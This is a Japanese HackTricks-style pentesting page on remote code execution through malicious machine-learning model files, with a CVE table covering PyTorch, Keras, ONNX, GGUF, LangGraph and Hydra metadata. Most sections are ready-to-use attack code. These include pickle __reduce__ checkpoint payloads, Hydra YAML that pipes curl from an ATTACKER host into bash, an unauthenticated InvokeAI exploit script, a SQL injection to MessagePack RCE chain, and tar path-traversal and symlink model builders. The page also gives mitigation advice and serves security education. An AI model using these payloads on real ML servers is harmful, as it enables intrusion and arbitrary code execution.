# Models RCE

{{#include ../banners/hacktricks-training.md}}

## モデルの読み込みによるRCE

Machine Learningモデルは通常、ONNX、TensorFlow、PyTorchなどのさまざまな形式で共有されます。これらのモデルは、開発者のマシンや本番システムに読み込まれて利用されます。通常、モデルに悪意のあるコードが含まれるべきではありませんが、意図された機能として、またはモデル読み込みライブラリの脆弱性が原因で、モデルを使ってシステム上で任意のコードを実行できる場合があります。

以下の表に、このカテゴリに該当する代表的な脆弱性を示します。

| **Framework / Tool**        | **脆弱性（該当する場合はCVE）**                                                    | **RCEのベクター**                                                                                                                           | **参考資料**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *`torch.load`における安全でないデシリアライズ* **(CVE-2025-32434)**                                                              | 悪意のあるpickleがモデルチェックポイントに含まれ、コード実行につながる（`weights_only`による保護を回避）                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + 悪意のあるモデルのダウンロードによりコードが実行される。Management APIでのJavaデシリアライズによるRCE                                        | |
| **NVIDIA Merlin Transformers4Rec** | `torch.load`経由の安全でないチェックポイントデシリアライズ **(CVE-2025-23298)**                                           | 信頼できないチェックポイントが`load_model_trainer_states_from_checkpoint`内でpickle reducerを実行し、ML workerでコード実行につながる            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + 安全でないMessagePack拡張フック **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | ユーザーが制御する`filter`キーでSQL/JSON-path構文を注入し、`UNION SELECT`で偽のチェックポイント行を生成。その後、`msgpack`デシリアライズが攻撃者指定のPythonコードをインポートして呼び出す | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (安全でないYAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | YAMLからモデルを読み込むと`yaml.unsafe_load`が使われる（コード実行） <br> **Lambda**レイヤーを含むモデルを読み込むと任意のPythonコードが実行される          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLiteのパース)                                                                                          | 細工された`.tflite`モデルが整数オーバーフローを引き起こし、ヒープ破損につながる（RCEの可能性）                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | `joblib.load`でモデルを読み込むと、攻撃者の`__reduce__`ペイロードを含むpickleが実行される                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (安全でない`np.load`) *異論あり*                                                                              | `numpy.load`はデフォルトでpickle化されたオブジェクト配列を許可していた。悪意のある`.npy/.npz`によりコードが実行される                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (ディレクトリトラバーサル) <br> **CVE-2024-5187** (tarトラバーサル)                                                    | ONNXモデルの外部重みファイルのパスがディレクトリ外を指し、任意のファイルを読み取れる <br> 悪意のあるONNXモデルのtarが任意のファイルを上書きし、RCEにつながる | |
| ONNX Runtime (design risk)  | *(CVEなし)* ONNXのカスタム演算子 / 制御フロー                                                                                    | カスタム演算子を含むモデルでは、攻撃者のネイティブコードを読み込む必要がある。複雑なモデルグラフがロジックを悪用し、意図しない計算を実行することもある   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (パストラバーサル)                                                                                          | `--model-control`を有効にした状態でモデル読み込みAPIを使うと、相対パストラバーサルでファイルを書き込める（例：RCEのために`.bashrc`を上書き）    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (複数のヒープオーバーフロー)                                                                         | 不正なGGUFモデルファイルがパーサーでヒープバッファオーバーフローを引き起こし、被害者のシステム上で任意のコードを実行できる                     | |
| **Keras (older formats)**   | *(新たなCVEなし)* Legacy Keras H5モデル                                                                                         | Lambdaレイヤーを含む悪意のあるHDF5 (`.h5`)モデルは、読み込み時にコードを実行する。Kerasのsafe_modeは古い形式を対象としていない（「downgrade attack」） | |
| **Others** (general)        | *設計上の欠陥* – Pickleシリアライズ                                                                                         | pickleベースのモデル形式やPythonの`pickle.load`など、多くのMLツールは、緩和策がなければモデルファイルに埋め込まれた任意のコードを実行する | |
| **NeMo / uni2TS / FlexTok (Hydra)** | 信頼できないメタデータが`hydra.utils.instantiate()`に渡される **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | 攻撃者が制御するモデルのメタデータ/設定で`_target_`を任意の呼び出し可能オブジェクト（例：`builtins.exec`）に設定すると、「安全な」形式（`.safetensors`、`.nemo`、リポジトリの`config.json`）でも読み込み時に実行される | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

さらに、[PyTorch](https://github.com/pytorch/pytorch/security)で使われるもののように、pickleベースのモデルの中には、`weights_only=True`を指定せずに読み込むと、システム上で任意のコードを実行できるものがあります。そのため、上記の表に記載されていなくても、pickleベースのモデルはこの種の攻撃に特に弱い可能性があります。

### Hydraメタデータ → RCE（safetensorsでも機能）

`hydra.utils.instantiate()`は、設定/メタデータオブジェクト内のドット区切りの`_target_`をインポートして呼び出します。Hugging Face Transformersなどのライブラリが**信頼できないモデルメタデータ**を`instantiate()`に渡す場合、攻撃者はモデル読み込み時に即座に実行される呼び出し可能オブジェクトと引数を指定できます（pickleは不要）。<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

ペイロードの例（`.nemo`の`model_config.yaml`、リポジトリの`config.json`、または`.safetensors`内の`__metadata__`で機能）:

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

主なポイント:
- NeMo の `restore_from/from_pretrained`、uni2TS HuggingFace coders、FlexTok loaders では、モデルの初期化前にトリガーされる。
- Hydra の文字列ブロックリストは、別の import path（例: `enum.bltns.eval`）や、アプリケーションによって解決される名前（例: `nemo.core.classes.common.os.system` → `posix`）を使って回避できる。<sup>[[14]](#references)</sup>
- FlexTok は文字列化されたメタデータも `ast.literal_eval` で解析するため、Hydra の呼び出し前に DoS（CPU／メモリの急激な消費）が可能になる。

### 🆕  `torch.load` による InvokeAI RCE（CVE-2024-12029）

`InvokeAI` は、Stable-Diffusion 用の人気の高いオープンソース Web インターフェースです。バージョン **5.3.1 – 5.4.2** では、任意の URL からモデルをダウンロードして読み込める REST endpoint `/api/v2/models/install` が公開されています。<sup>[[1]](#references)</sup>

内部では、この endpoint は最終的に次を呼び出します。

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

提供されたファイルが **PyTorch checkpoint (`*.ckpt`)** の場合、`torch.load` は **pickle deserialization** を実行します。コンテンツはユーザーが制御する URL から直接取得されるため、攻撃者は checkpoint 内にカスタム `__reduce__` メソッドを持つ悪意あるオブジェクトを埋め込めます。このメソッドは **deserialization 中に**実行され、InvokeAI server 上で **remote code execution (RCE)** が発生します。

この脆弱性には **CVE-2024-12029** が割り当てられました（CVSS 9.8、EPSS 61.17 %）。

#### Exploitation walk-through

1. 悪意ある checkpoint を作成します。

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. `payload.ckpt` を自分が管理する HTTP サーバー上でホストします（例: `http://ATTACKER/payload.ckpt`）。
3. 脆弱なエンドポイントをトリガーします（認証は不要です）：

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. InvokeAI がファイルをダウンロードすると `torch.load()` を呼び出し、`os.system` gadget が実行され、攻撃者は InvokeAI プロセスのコンテキストでコード実行を獲得します。

すぐに使える exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` が一連の流れを自動化します。<sup>[[3]](#references)</sup>

#### 条件

•  InvokeAI 5.3.1-5.4.2（scan フラグのデフォルトは **false**）
•  `/api/v2/models/install` に攻撃者がアクセスできる
•  プロセスに shell コマンドを実行する権限がある

#### 緩和策

* **InvokeAI ≥ 5.4.3** にアップグレードする – パッチにより、デフォルトで `scan=True` が設定され、デシリアライズ前に malware scanning が実行されます。<sup>[[2]](#references)</sup>
* プログラムから checkpoint を読み込む場合は、`torch.load(file, weights_only=True)` または新しい [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper を使用します。
* model source と署名に allow-list を適用し、最小権限でサービスを実行します。

> ⚠️ 信頼できないソースからデシリアライズする場合、Python の pickle ベースの形式（多くの `.pt`、`.pkl`、`.ckpt`、`.pth` ファイルを含む）は**すべて**本質的に安全ではないことを忘れないでください。

---

古い InvokeAI バージョンを reverse proxy の背後で稼働させ続ける必要がある場合の、場当たり的な緩和策の例:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 NVIDIA Merlin Transformers4Rec の unsafe `torch.load` による RCE (CVE-2025-23298)

NVIDIA の Transformers4Rec (Merlin の一部) には、ユーザーが指定したパスに対して `torch.load()` を直接呼び出す、unsafe な checkpoint loader がありました。`torch.load` は Python の `pickle` に依存しているため、攻撃者が用意した checkpoint は、デシリアライズ中に reducer を介して任意のコードを実行できます。<sup>[[5]](#references)</sup>

脆弱なパス (修正前): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`。

RCE につながる理由: Python の pickle では、オブジェクトが callable と引数を返す reducer (`__reduce__`/`__setstate__`) を定義できます。unpickling 中にその callable が実行されます。そのようなオブジェクトが checkpoint に含まれている場合、重みが使用される前に実行されます。

最小限の悪意ある checkpoint の例:

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

配布経路と影響範囲:
- リポジトリ、バケット、artifact registryを通じて共有されるトロイの木馬化されたcheckpoint/model
- checkpointを自動ロードする、自動化されたresume/deploy pipeline
- 学習/推論worker内で実行され、多くの場合、高い権限（例: コンテナ内のroot）で動作する

修正: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)（PR #802）では、直接的な `torch.load()` を、`transformers4rec/utils/serialization.py` に実装された、制限付きのallow-list方式のデシリアライザーに置き換えました。新しいloaderは型/フィールドを検証し、ロード時に任意のcallableが呼び出されるのを防ぎます。<sup>[[7]](#references)</sup>

PyTorch checkpointに固有の防御ガイダンス:
- 信頼できないデータをunpickleしないでください。可能であれば、[Safetensors](https://huggingface.co/docs/safetensors/index)やONNXのような実行可能コードを含まない形式を優先してください。
- PyTorch serializationを使用する必要がある場合は、`weights_only=True`（新しいPyTorchでサポート）を必ず指定するか、Transformers4Recのpatchと同様の、allow-list方式のカスタムunpicklerを使用してください。<sup>[[4]](#references)</sup>
- modelのprovenance/signatureを検証し、デシリアライズをsandbox化してください（seccomp/AppArmor、非rootユーザー、制限されたFS、外向きネットワーク接続なし）。
- checkpointのロード時に、ML serviceから予期しないchild processが起動していないか監視し、`torch.load()`/`pickle`の使用を追跡してください。

POCおよび脆弱なloader/patchの参照:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- patch適用前の脆弱なloader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- 悪意のあるcheckpointのPOC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- patch適用後のloader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## 例 – 悪意のあるPyTorch modelの作成

- modelを作成する:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- モデルをロードする：

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Tencent FaceDetection-DSFD resnet のデシリアライズ (CVE-2025-13715 / ZDI-25-1183)

Tencent の FaceDetection-DSFD は、ユーザーが制御するデータをデシリアライズする `resnet` endpoint を公開しています。ZDI の確認によると、リモート攻撃者は被害者を誘導して悪意あるページやファイルを読み込ませ、それによって細工したシリアライズ済み blob をその endpoint に送信させることで、`root` としてデシリアライズを実行し、システムを完全に侵害できます。

この exploit の流れは、一般的な pickle の悪用と同様です:

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

デシリアライズ中に到達可能な gadget（コンストラクター、`__setstate__`、framework の callback など）は、通信手段が HTTP、WebSocket、監視対象ディレクトリに置かれたファイルのいずれであっても、同じ方法で weaponize できます。



### LangGraph checkpointer SQLi → MessagePack RCE

この攻撃チェーンが興味深いのは、攻撃者が**悪意のある model file をアップロードする必要がない**点です。代わりに、アプリケーションが**AI-agent persistence API**（`get_state_history(..., filter=...)`）を公開しており、user input が checkpointer query builder に到達します。

#### 1. metadata filters における構造的 SQLi

脆弱な SQLite のパターンは次のようなものでした。

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

値は後でバインドされますが、`query_key` は **JSON path 文字列**に連結されるため、辞書キー内の `'` によって `'$.{query_key}'` を抜け出し、SQLを注入できます。同じ教訓は **JSON paths、identifiers、operators、`LIMIT`、TTL fields** にも当てはまります。プレースホルダーで保護できるのは値だけで、クエリ構文の構造部分は保護できません。

#### 2. `UNION SELECT` はデータ窃取だけでなく、後続のsinkも狙える

このクエリは `type` とシリアライズされた `checkpoint` bytes を返し、後で次のように使用されます。

```python
self.serde.loads_typed((type, checkpoint))
```

つまり、`WHERE`句のSQLiでは**偽の結果行**を注入できます：

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

後続のコードで選択したカラムを解析、deserialize、書き込み、または実行する場合は、それらのカラムを対応するsinkに紐づけます。このケースでは、偽の行によってSQLiが**攻撃者制御のdeserialize**に変わります。

#### 3. Unsafe MessagePack extension hooks は code gadget と同等

LangGraphの`msgpack`パスでは、ネストされたタプルをunpackして、次の処理を実行するカスタムextension hookが使われていました。

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

したがって、`("os", "system", "id > /tmp/pwned")` と同等の内容をエンコードした MessagePack extension object は、`os` を import し、`system` を解決してコマンドを実行します。AI framework をレビューする際は、dynamic import、reflection、または任意の callable dispatch を行う**custom MessagePack/JSON/pickle reviver**を調査してください。

#### 4. Agent framework の実践的な監査パターン

次に到達するユーザー制御入力をレビューしてください。
- state history / memory / replay / checkpoint listing API
- SQL または Redis query fragment を生成する構造化 filter builder
- custom deserializer（`pickle`、`msgpack`、`json` object hook、YAML constructor）
- persistence layer から返された行を信頼する recovery path

この特定の chain は、信頼できないユーザーが `filter` を制御できる場合に、**SQLite** または **Redis** の checkpointer を使用する self-hosted LangGraph deployment に影響しました。開示で示された修正済みバージョンは、`langgraph-checkpoint-sqlite 3.0.1+`、`langgraph 1.0.10+`、`langgraph-checkpoint-redis 1.0.2+`、および `langgraph-checkpoint 4.0.1+` です。<sup>[[15]](#references)</sup>

## Models から Path Traversal へ

[**この blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)で述べられているように、さまざまな AI framework で使用されるほとんどの model format は、通常 `.zip` などの archive に基づいています。そのため、これらの format を悪用して path traversal attack を実行し、model がロードされるシステムから任意のファイルを読み取れる可能性があります。<sup>[[16]](#references)</sup>

たとえば、次のコードを使うと、ロード時に `/tmp` ディレクトリ内にファイルを作成する model を作成できます。

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

または、次のコードを使うと、読み込み時に `/tmp` ディレクトリへの symlink を作成するモデルを作成できます：

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### 詳細解説: Keras .keras のデシリアライズと gadget hunting

.keras の内部構造、Lambda layer による RCE、≤ 3.8 における任意の import の問題、修正後の allowlist 内での gadget discovery に焦点を当てたガイドについては、以下を参照してください。


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [OffSec blog –「CVE-2024-12029 – InvokeAI における信頼できないデータのデシリアライズ」](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [InvokeAI のパッチコミット 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Rapid7 Metasploit モジュールのドキュメント](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – torch.load のセキュリティに関する考慮事項](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [ZDI blog – CVE-2025-23298: NVIDIA Merlin でリモートコード実行を実現](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [ZDI アドバイザリ: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Transformers4Rec のパッチコミット b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [パッチ適用前の脆弱な loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [悪意のある checkpoint の PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [パッチ適用後の loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – 最新の AI/ML 形式とライブラリを利用したリモートコード実行](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Hydra instantiate のドキュメント](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Hydra の block-list コミット (RCE に関する警告)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – SQLi から RCE へ: LangGraph の Checkpointer を悪用する](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Archive Slip のバグを高価値な AI/ML バウンティへ活用する](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
{{#include ../banners/hacktricks-training.md}}
